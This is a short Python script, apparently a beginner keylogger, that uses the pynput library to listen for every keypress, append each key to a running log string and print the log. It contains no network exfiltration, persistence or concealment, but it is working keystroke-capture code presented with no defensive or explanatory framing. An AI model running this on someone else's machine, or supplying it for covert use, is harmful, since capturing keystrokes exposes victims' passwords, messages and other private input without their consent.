import pynput.keyboard

log =""

def callback_function(key):
    global log
    try:
        #log = log + key.char.encode('utf-8')
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

key_logger_listener = pynput.keyboard.Listener(on_press=callback_function)

#threading

with key_logger_listener:
    key_logger_listener.join()
